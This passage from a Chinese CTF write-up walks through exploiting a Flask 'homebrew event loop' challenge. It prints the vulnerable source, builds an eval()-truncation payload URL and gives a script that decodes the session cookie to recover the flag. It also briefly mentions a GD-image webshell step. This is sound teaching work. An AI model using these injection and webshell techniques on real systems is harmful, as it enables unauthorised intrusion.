href="https://wiki.ioin.in/soft/detail/1q" target="_blank" rel="noopener">https://wiki.ioin.in/soft/detail/1q</a></p><p><code>jpg_name.jpg</code>是待GD处理的图片</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php jpg_payload.php &lt;jpg_name.jpg&gt;</span><br></pre></td></tr></table></figure><p>如提示缺少gd库，可用<code>apt install php-gd</code>安装</p><p>网上不少文章提到不一定每张图片都可以成功写入，需要多试几张，而我脸比较黑，试了十多张无果。</p><p>绝望之际，拿了群里大佬发的一个表情包，终于成功了，泪目。。。</p><p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190418133806-246e60d8-619c-1.png" alt=""></p><h3 id="homebrew-event-loop"><a href="#homebrew-event-loop" class="headerlink" title="homebrew event loop"></a>homebrew event loop</h3><p><a href="http://116.85.48.107:5002/d5afe1f66147e857/" target="_blank" rel="noopener">http://116.85.48.107:5002/d5afe1f66147e857/</a></p><p>题目是一个flask站，并且提供了源码</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, session, request, Response </span><br><span class="line"><span class="keyword">import</span> urllib </span><br><span class="line"></span><br><span class="line">app = Flask(__name__) </span><br><span class="line">app.secret_key = <span class="string">'*********************'</span> <span class="comment"># censored </span></span><br><span class="line">url_prefix = <span class="string">'/d5afe1f66147e857'</span> </span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">FLAG</span><span class="params">()</span>:</span> </span><br><span class="line">    <span class="keyword">return</span> <span class="string">'FLAG_is_here_but_i_wont_show_you'</span>  <span class="comment"># censored </span></span><br><span class="line">     </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">trigger_event</span><span class="params">(event)</span>:</span> </span><br><span class="line">    session[<span class="string">'log'</span>].append(event) </span><br><span class="line">    <span class="keyword">if</span> len(session[<span class="string">'log'</span>]) &gt; <span class="number">5</span>: session[<span class="string">'log'</span>] = session[<span class="string">'log'</span>][<span class="number">-5</span>:] </span><br><span class="line">    <span class="keyword">if</span> type(event) == type([]): </span><br><span class="line">        request.event_queue += event </span><br><span class="line">    <span class="keyword">else</span>: </span><br><span class="line">        request.event_queue.append(event) </span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_mid_str</span><span class="params">(haystack, prefix, postfix=None)</span>:</span> </span><br><span class="line">    haystack = haystack[haystack.find(prefix)+len(prefix):] </span><br><span class="line">    <span class="keyword">if</span> postfix <span class="keyword">is</span> <span class="keyword">not</span> <span class="keyword">None</span>: </span><br><span class="line">        haystack = haystack[:haystack.find(postfix)] </span><br><span class="line">    <span class="keyword">return</span> haystack </span><br><span class="line">     </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">RollBackException</span>:</span> <span class="keyword">pass</span> </span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">execute_event_loop</span><span class="params">()</span>:</span> </span><br><span class="line">    valid_event_chars = set(<span class="string">'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ_0123456789:;#'</span>) </span><br><span class="line">    resp = <span class="keyword">None</span> </span><br><span class="line">    <span class="keyword">while</span> len(request.event_queue) &gt; <span class="number">0</span>: </span><br><span class="line">        event = request.event_queue[<span class="number">0</span>] <span class="comment"># `event` is something like "action:ACTION;ARGS0#ARGS1#ARGS2......" </span></span><br><span class="line">        request.event_queue = request.event_queue[<span class="number">1</span>:] </span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> event.startswith((<span class="string">'action:'</span>, <span class="string">'func:'</span>)): <span class="keyword">continue</span> </span><br><span class="line">        <span class="keyword">for</span> c <span class="keyword">in</span> event: </span><br><span class="line">            <span class="keyword">if</span> c <span class="keyword">not</span> <span class="keyword">in</span> valid_event_chars: <span class="keyword">break</span> </span><br><span class="line">        <span class="keyword">else</span>: </span><br><span class="line">            is_action = event[<span class="number">0</span>] == <span class="string">'a'</span> </span><br><span class="line">            action = get_mid_str(event, <span class="string">':'</span>, <span class="string">';'</span>) </span><br><span class="line">            args = get_mid_str(event, action+<span class="string">';'</span>).split(<span class="string">'#'</span>) </span><br><span class="line">            <span class="keyword">try</span>: </span><br><span class="line">                event_handler = eval(action + (<span class="string">'_handler'</span> <span class="keyword">if</span> is_action <span class="keyword">else</span> <span class="string">'_function'</span>)) </span><br><span class="line">                ret_val = event_handler(args) </span><br><span class="line">            <span class="keyword">except</span> RollBackException: </span><br><span class="line">                <span class="keyword">if</span> resp <span class="keyword">is</span> <span class="keyword">None</span>: resp = <span class="string">''</span> </span><br><span class="line">                resp += <span class="string">'ERROR! All transactions have been cancelled. &lt;br /&gt;'</span> </span><br><span class="line">                resp += <span class="string">'&lt;a href="./?action:view;index"&gt;Go back to index.html&lt;/a&gt;&lt;br /&gt;'</span> </span><br><span class="line">                session[<span class="string">'num_items'</span>] = request.prev_session[<span class="string">'num_items'</span>] </span><br><span class="line">                session[<span class="string">'points'</span>] = request.prev_session[<span class="string">'points'</span>] </span><br><span class="line">                <span class="keyword">break</span> </span><br><span class="line">            <span class="keyword">except</span> Exception, e: </span><br><span class="line">                <span class="keyword">if</span> resp <span class="keyword">is</span> <span class="keyword">None</span>: resp = <span class="string">''</span> </span><br><span class="line">                <span class="comment">#resp += str(e) # only for debugging </span></span><br><span class="line">                <span class="keyword">continue</span> </span><br><span class="line">            <span class="keyword">if</span> ret_val <span class="keyword">is</span> <span class="keyword">not</span> <span class="keyword">None</span>: </span><br><span class="line">                <span class="keyword">if</span> resp <span class="keyword">is</span> <span class="keyword">None</span>: resp = ret_val </span><br><span class="line">                <span class="keyword">else</span>: resp += ret_val </span><br><span class="line">    <span class="keyword">if</span> resp <span class="keyword">is</span> <span class="keyword">None</span> <span class="keyword">or</span> resp == <span class="string">''</span>: resp = (<span class="string">'404 NOT FOUND'</span>, <span class="number">404</span>) </span><br><span class="line">    session.modified = <span class="keyword">True</span> </span><br><span class="line">    <span class="keyword">return</span> resp </span><br><span class="line">     </span><br><span class="line"><span class="meta">@app.route(url_prefix+'/') </span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">entry_point</span><span class="params">()</span>:</span> </span><br><span class="line">    querystring = urllib.unquote(request.query_string) </span><br><span class="line">    request.event_queue = [] </span><br><span class="line">    <span class="keyword">if</span> querystring == <span class="string">''</span> <span class="keyword">or</span> (<span class="keyword">not</span> querystring.startswith(<span class="string">'action:'</span>)) <span class="keyword">or</span> len(querystring) &gt; <span class="number">100</span>: </span><br><span class="line">        querystring = <span class="string">'action:index;False#False'</span> </span><br><span class="line">    <span class="keyword">if</span> <span class="string">'num_items'</span> <span class="keyword">not</span> <span class="keyword">in</span> session: </span><br><span class="line">        session[<span class="string">'num_items'</span>] = <span class="number">0</span> </span><br><span class="line">        session[<span class="string">'points'</span>] = <span class="number">3</span> </span><br><span class="line">        session[<span class="string">'log'</span>] = [] </span><br><span class="line">    request.prev_session = dict(session) </span><br><span class="line">    trigger_event(querystring) </span><br><span class="line">    <span class="keyword">return</span> execute_event_loop() </span><br><span class="line"></span><br><span class="line"><span class="comment"># handlers/functions below -------------------------------------- </span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">view_handler</span><span class="params">(args)</span>:</span> </span><br><span class="line">    page = args[<span class="number">0</span>] </span><br><span class="line">    html = <span class="string">''</span> </span><br><span class="line">    html += <span class="string">'[INFO] you have &#123;&#125; diamonds, &#123;&#125; points now.&lt;br /&gt;'</span>.format(session[<span class="string">'num_items'</span>], session[<span class="string">'points'</span>]) </span><br><span class="line">    <span class="keyword">if</span> page == <span class="string">'index'</span>: </span><br><span class="line">        html += <span class="string">'&lt;a href="./?action:index;True%23False"&gt;View source code&lt;/a&gt;&lt;br /&gt;'</span> </span><br><span class="line">        html += <span class="string">'&lt;a href="./?action:view;shop"&gt;Go to e-shop&lt;/a&gt;&lt;br /&gt;'</span> </span><br><span class="line">        html += <span class="string">'&lt;a href="./?action:view;reset"&gt;Reset&lt;/a&gt;&lt;br /&gt;'</span> </span><br><span class="line">    <span class="keyword">elif</span> page == <span class="string">'shop'</span>: </span><br><span class="line">        html += <span class="string">'&lt;a href="./?action:buy;1"&gt;Buy a diamond (1 point)&lt;/a&gt;&lt;br /&gt;'</span> </span><br><span class="line">    <span class="keyword">elif</span> page == <span class="string">'reset'</span>: </span><br><span class="line">        <span class="keyword">del</span> session[<span class="string">'num_items'</span>] </span><br><span class="line">        html += <span class="string">'Session reset.&lt;br /&gt;'</span> </span><br><span class="line">    html += <span class="string">'&lt;a href="./?action:view;index"&gt;Go back to index.html&lt;/a&gt;&lt;br /&gt;'</span> </span><br><span class="line">    <span class="keyword">return</span> html </span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index_handler</span><span class="params">(args)</span>:</span> </span><br><span class="line">    bool_show_source = str(args[<span class="number">0</span>]) </span><br><span class="line">    bool_download_source = str(args[<span class="number">1</span>]) </span><br><span class="line">    <span class="keyword">if</span> bool_show_source == <span class="string">'True'</span>: </span><br><span class="line">     </span><br><span class="line">        source = open(<span class="string">'eventLoop.py'</span>, <span class="string">'r'</span>) </span><br><span class="line">        html = <span class="string">''</span> </span><br><span class="line">        <span class="keyword">if</span> bool_download_source != <span class="string">'True'</span>: </span><br><span class="line">            html += <span class="string">'&lt;a href="./?action:index;True%23True"&gt;Download this .py file&lt;/a&gt;&lt;br /&gt;'</span> </span><br><span class="line">            html += <span class="string">'&lt;a href="./?action:view;index"&gt;Go back to index.html&lt;/a&gt;&lt;br /&gt;'</span> </span><br><span class="line">             </span><br><span class="line">        <span class="keyword">for</span> line <span class="keyword">in</span> source: </span><br><span class="line">            <span class="keyword">if</span> bool_download_source != <span class="string">'True'</span>: </span><br><span class="line">                html += line.replace(<span class="string">'&amp;'</span>,<span class="string">'&amp;amp;'</span>).replace(<span class="string">'\t'</span>, <span class="string">'&amp;nbsp;'</span>*<span class="number">4</span>).replace(<span class="string">' '</span>,<span class="string">'&amp;nbsp;'</span>).replace(<span class="string">'&lt;'</span>, <span class="string">'&amp;lt;'</span>).replace(<span class="string">'&gt;'</span>,<span class="string">'&amp;gt;'</span>).replace(<span class="string">'\n'</span>, <span class="string">'&lt;br /&gt;'</span>) </span><br><span class="line">            <span class="keyword">else</span>: </span><br><span class="line">                html += line </span><br><span class="line">        source.close() </span><br><span class="line">         </span><br><span class="line">        <span class="keyword">if</span> bool_download_source == <span class="string">'True'</span>: </span><br><span class="line">            headers = &#123;&#125; </span><br><span class="line">            headers[<span class="string">'Content-Type'</span>] = <span class="string">'text/plain'</span> </span><br><span class="line">            headers[<span class="string">'Content-Disposition'</span>] = <span class="string">'attachment; filename=serve.py'</span> </span><br><span class="line">            <span class="keyword">return</span> Response(html, headers=headers) </span><br><span class="line">        <span class="keyword">else</span>: </span><br><span class="line">            <span class="keyword">return</span> html </span><br><span class="line">    <span class="keyword">else</span>: </span><br><span class="line">        trigger_event(<span class="string">'action:view;index'</span>) </span><br><span class="line">         </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">buy_handler</span><span class="params">(args)</span>:</span> </span><br><span class="line">    num_items = int(args[<span class="number">0</span>]) </span><br><span class="line">    <span class="keyword">if</span> num_items &lt;= <span class="number">0</span>: <span class="keyword">return</span> <span class="string">'invalid number(&#123;&#125;) of diamonds to buy&lt;br /&gt;'</span>.format(args[<span class="number">0</span>]) </span><br><span class="line">    session[<span class="string">'num_items'</span>] += num_items  </span><br><span class="line">    trigger_event([<span class="string">'func:consume_point;&#123;&#125;'</span>.format(num_items), <span class="string">'action:view;index'</span>]) </span><br><span class="line">     </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">consume_point_function</span><span class="params">(args)</span>:</span> </span><br><span class="line">    point_to_consume = int(args[<span class="number">0</span>]) </span><br><span class="line">    <span class="keyword">if</span> session[<span class="string">'points'</span>] &lt; point_to_consume: <span class="keyword">raise</span> RollBackException() </span><br><span class="line">    session[<span class="string">'points'</span>] -= point_to_consume </span><br><span class="line">     </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show_flag_function</span><span class="params">(args)</span>:</span> </span><br><span class="line">    flag = args[<span class="number">0</span>] </span><br><span class="line">    <span class="comment">#return flag # GOTCHA! We noticed that here is a backdoor planted by a hacker which will print the flag, so we disabled it. </span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">'You naughty boy! ;) &lt;br /&gt;'</span> </span><br><span class="line">     </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_flag_handler</span><span class="params">(args)</span>:</span> </span><br><span class="line">    <span class="keyword">if</span> session[<span class="string">'num_items'</span>] &gt;= <span class="number">5</span>: </span><br><span class="line">        trigger_event(<span class="string">'func:show_flag;'</span> + FLAG()) <span class="comment"># show_flag_function has been disabled, no worries </span></span><br><span class="line">    trigger_event(<span class="string">'action:view;index'</span>) </span><br><span class="line">     </span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>: </span><br><span class="line">    app.run(debug=<span class="keyword">False</span>, host=<span class="string">'0.0.0.0'</span>)</span><br></pre></td></tr></table></figure><p>网址实现各种功能，是通过解析<code>query_string</code>进行跳转的，具体可以查看<code>execute_event_loop</code>函数代码。<code>query_string</code>示例如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http://116.85.48.107:5002/d5afe1f66147e857/?action:buy;1</span><br><span class="line">http://116.85.48.107:5002/d5afe1f66147e857/?action:view;shop</span><br></pre></td></tr></table></figure><p>提取关键代码测试，可以看到更加直观，代码如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_mid_str</span><span class="params">(haystack, prefix, postfix=None)</span>:</span></span><br><span class="line">haystack = haystack[haystack.find(prefix)+len(prefix):]</span><br><span class="line"><span class="keyword">if</span> postfix <span class="keyword">is</span> <span class="keyword">not</span> <span class="keyword">None</span>:</span><br><span class="line">haystack = haystack[:haystack.find(postfix)]</span><br><span class="line"><span class="keyword">return</span> haystack</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">ACTION_handler</span><span class="params">()</span>:</span><span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line">event = <span class="string">'action:ACTION;ARGS0#ARGS1#ARGS2'</span></span><br><span class="line">is_action = event[<span class="number">0</span>] == <span class="string">'a'</span></span><br><span class="line">action = get_mid_str(event, <span class="string">':'</span>, <span class="string">';'</span>)</span><br><span class="line"><span class="keyword">print</span> <span class="string">'[!] action:'</span>,action</span><br><span class="line">args = get_mid_str(event, action+<span class="string">';'</span>).split(<span class="string">'#'</span>)</span><br><span class="line"><span class="keyword">print</span> <span class="string">'[!] args:'</span>,args</span><br><span class="line">event_handler = eval(action + (<span class="string">'_handler'</span> <span class="keyword">if</span> is_action <span class="keyword">else</span> <span class="string">'_function'</span>))</span><br><span class="line"><span class="keyword">print</span> <span class="string">'[!] event_handler:'</span>,event_handler</span><br></pre></td></tr></table></figure><p>运行结果：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[!] action: ACTION</span><br><span class="line">[!] args: [&apos;ARGS0&apos;, &apos;ARGS1&apos;, &apos;ARGS2&apos;]</span><br><span class="line">[!] event_handler: &lt;function ACTION_handler at 0x00000000035A4B38&gt;</span><br></pre></td></tr></table></figure></p><p><code>event_handler</code>是用<code>eval</code>进行拼接，从而得到对应的处理函数，<code>eval</code>函数本质是将字符串str当成有效的表达式来求值并返回计算结果，程序过滤了大部分的特殊符号，导致我们不能随意进行代码注入，不过由于<code>ARGS</code>是使用<code>#</code>进行分隔，而<code>#</code>在python代码中是注释符，在<code>action</code>中加入<code>#</code>，可以把后面<code>_handler</code>注释掉。上面的代码用<code>event = &#39;action:str#;ARGS0#ARGS1#ARGS2&#39;</code>进行测试一下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[!] action: str#</span><br><span class="line">[!] args: [&apos;ARGS0&apos;, &apos;ARGS1&apos;, &apos;ARGS2&apos;]</span><br><span class="line">[!] event_handler: &lt;type &apos;str&apos;&gt;</span><br></pre></td></tr></table></figure><p>现在，我们可以控制<code>event_handler</code>运行指定的函数，不过还有一个问题是<code>FLAG()</code>函数是不带参数的，而<code>args</code>为<code>list</code>，直接传入<code>action:FLAG;</code>将产生报错。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">TypeError: FLAG() takes no arguments (1 given)</span><br></pre></td></tr></table></figure><p>直接调用<code>FLAG()</code>函数的方法走不通了，由于传入参数必须是<code>list</code>类型，python自带的全局函数也没有可以用（如果有求告知~），那么只能考虑自带函数。自带的函数不多，不难找到<code>trigger_event</code>。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">trigger_event</span><span class="params">(event)</span>:</span></span><br><span class="line">session[<span class="string">'log'</span>].append(event)</span><br><span class="line"><span class="keyword">if</span> len(session[<span class="string">'log'</span>]) &gt; <span class="number">5</span>: session[<span class="string">'log'</span>] = session[<span class="string">'log'</span>][<span class="number">-5</span>:]</span><br><span class="line"><span class="keyword">if</span> type(event) == type([]):</span><br><span class="line">request.event_queue += event</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">request.event_queue.append(event)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">execute_event_loop</span><span class="params">()</span>:</span></span><br><span class="line">valid_event_chars = set(<span class="string">'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ_0123456789:;#'</span>)</span><br><span class="line">resp = <span class="keyword">None</span></span><br><span class="line"><span class="keyword">while</span> len(request.event_queue) &gt; <span class="number">0</span>:</span><br><span class="line">event = request.event_queue[<span class="number">0</span>] <span class="comment"># `event` is something like "action:ACTION;ARGS0#ARGS1#ARGS2......"</span></span><br><span class="line">request.event_queue = request.event_queue[<span class="number">1</span>:]</span><br><span class="line">...</span><br></pre></td></tr></table></figure><p>参数<code>event</code>为<code>list</code>类型，<code>execute_event_loop</code>按顺序处理<code>request.event_queue</code>所有<code>event</code>，我们可以考虑构造一套组合拳来获取flag。具体构造思路如下：</p><ol><li>程序调用<code>FLAG()</code>的地方只有一个，就是<code>get_flag_handler()</code>，对应的<code>event1=action:get_flag;</code>；</li><li><code>get_flag_handler()</code>会判断<code>session[&#39;num_items&#39;]&gt;=5</code>，因此需要购买5个以上的钻石，对应的<code>event2=action:buy;5</code>；</li><li>传入<code>query_string=action:trigger_event#;{event1}#{event2}</code>，利用<code>#</code>截断，运行<code>trigger_event([event1,event2])</code></li></ol><p>此外，还有两个问题需要解决一下</p><ol><li><code>show_flag_function()</code>把返回的FLAG注释掉了，FLAG只会加入到<code>show_flag_function()</code>参数中。</li><li><code>buy_handler()</code>后会调用<code>consume_point_function()</code>检查<code>point</code>是否足够，不然就会回滚。</li></ol><p><code>trigger_event</code>有一句代码<code>session[&#39;log&#39;].append(event)</code>，会把记录各种函数的调用，那么自然会把<code>trigger_event(&#39;func:show_flag;&#39;+FLAG())</code>存在放在<code>session[&#39;log&#39;]</code>中。留意到<code>execute_event_loop</code>是按先后顺序进行函数调用，因此<code>buy_handler()</code>后并不会马上执行<code>consume_point_function()</code>，如果后面紧跟是<code>show_flag_function()</code>，并不会受回滚影响。由于flag存放在session中，需要解密一下cookie，flask的session问题具体可以看看p神博客，<a href="https://www.leavesongs.com/PENETRATION/client-session-security.html" target="_blank" rel="noopener">客户端 session 导致的安全问题</a></p><p>最终payload：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">http://116.85.48.107:5002/d5afe1f66147e857/?action:trigger_event%23;action:buy;7%23action:get_flag;</span><br><span class="line"></span><br><span class="line">ERROR! All transactions have been cancelled. </span><br><span class="line">Go back to index.html</span><br></pre></td></tr></table></figure><p>获取到的cookie</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Set-Cookie: session=.eJyNjlFLwzAAhP-K5HkPbersUujLcCkM2uCsTRoRaZo5m6VZsOvmMvrfVwQFmQ--Hdzdd3cGercB0fMZ3AgQgZJmXkVRT8zqVFFpOFu-cca1MA-KQKxkog9C2UaybZidsvcyWFkBb-84LDwGeVfSOgTD5ArXLv113gWjdeVILTFqRYINOcYxGF5-2twUfemsEnDqJPU1C-aHik494ur4D5LhlrM6HBNbzjZfpN8gVyUo-H6ZBqWXFjMnVdZLPPtM7-dHBjHh45l8gfNHH6l0gT5S-vTPMWD69rXZr9sORP4E2F1j9qOEwwXM_XDJ.D5b-8w.YcblUXhGWeGzHVT6qLNwR2zCOV4; HttpOnly; Path=/</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> zlib</span><br><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> base64 <span class="keyword">import</span> b64decode</span><br><span class="line"><span class="keyword">from</span> flask.sessions <span class="keyword">import</span> URLSafeTimedSerializer,session_json_serializer</span><br><span class="line"><span class="keyword">from</span> itsdangerous <span class="keyword">import</span> base64_decode</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">decryption</span><span class="params">(payload)</span>:</span></span><br><span class="line">    payload, sig = payload.rsplit(<span class="string">b'.'</span>, <span class="number">1</span>)</span><br><span class="line">    payload, timestamp = payload.rsplit(<span class="string">b'.'</span>, <span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">    decompress = <span class="keyword">False</span></span><br><span class="line">    <span class="keyword">if</span> payload.startswith(<span class="string">b'.'</span>):</span><br><span class="line">        payload = payload[<span class="number">1</span>:]</span><br><span class="line">        decompress = <span class="keyword">True</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        payload = base64_decode(payload)</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="keyword">raise</span> Exception(<span class="string">'Could not base64 decode the payload because of '</span></span><br><span class="line">                         <span class="string">'an exception'</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> decompress:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            payload = zlib.decompress(payload)</span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            <span class="keyword">raise</span> Exception(<span class="string">'Could not zlib decompress the payload before '</span></span><br><span class="line">                             <span class="string">'decoding the payload'</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> session_json_serializer.loads(payload)</span><br><span class="line"></span><br><span class="line">sessions = <span class="string">'.eJyNjlFLwzAAhP-K5HkPbersUujLcCkM2uCsTRoRaZo5m6VZsOvmMvrfVwQFmQ--Hdzdd3cGercB0fMZ3AgQgZJmXkVRT8zqVFFpOFu-cca1MA-KQKxkog9C2UaybZidsvcyWFkBb-84LDwGeVfSOgTD5ArXLv113gWjdeVILTFqRYINOcYxGF5-2twUfemsEnDqJPU1C-aHik494ur4D5LhlrM6HBNbzjZfpN8gVyUo-H6ZBqWXFjMnVdZLPPtM7-dHBjHh45l8gfNHH6l0gT5S-vTPMWD69rXZr9sORP4E2F1j9qOEwwXM_XDJ.D5b-8w.YcblUXhGWeGzHVT6qLNwR2zCOV4'</span></span><br><span class="line">PAYLOAD = decryption(sessions.encode())</span><br><span class="line"><span class="keyword">print</span> PAYLOAD</span><br></pre></td></tr></table></figure><p>查看session的解析结果，函数的调用过程更加一目了然了。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;u&apos;points&apos;: 2, u&apos;num_items&apos;: 1, u&apos;log&apos;: [&apos;action:trigger_event#;action:buy;7#action:get_flag;&apos;, [&apos;action:buy;7&apos;, &apos;action:get_flag;&apos;], [&apos;func:consume_point;7&apos;, &apos;action:view;index&apos;], &apos;func:show_flag;3v41_3v3nt_100p_aNd_fLASK_c0Ok1e&apos;, &apos;action:view;index&apos;]&#125;</span><br></pre></td></tr></table></figure><h3 id="大吉大利，今晚吃鸡"><a href="#大吉大利，今晚吃鸡" class="headerlink" title="大吉大利，今晚吃鸡"></a>大吉大利，今晚吃鸡</h3><p><a href="http://117.51.147.155:5050/index.html" target="_blank" 